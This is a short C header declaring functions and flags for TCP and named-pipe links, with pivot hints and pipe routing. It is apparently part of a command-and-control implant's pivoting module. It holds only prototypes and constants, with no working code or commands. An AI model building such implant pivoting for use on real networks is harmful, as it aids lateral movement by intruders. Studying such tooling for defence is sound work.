#pragma once
#include "protocol.h"

#define HINT_REVERSE 0x10000
#define HINT_FORWARD 0
#define HINT_PROTO_PIPE 0
#define HINT_PROTO_TCP 0x100000

void LinkViaTcp(char* buffer, int length);

SOCKET LinkViaTcpConnect(char* target, short port);

BOOL LinkAdd(PROTOCOL* protocol, int pivotHints);

void PipeReopen(char* buffer, int length);

void PipeClose(char* buffer, int length);

void PipeRoute(char* buffer, int length);
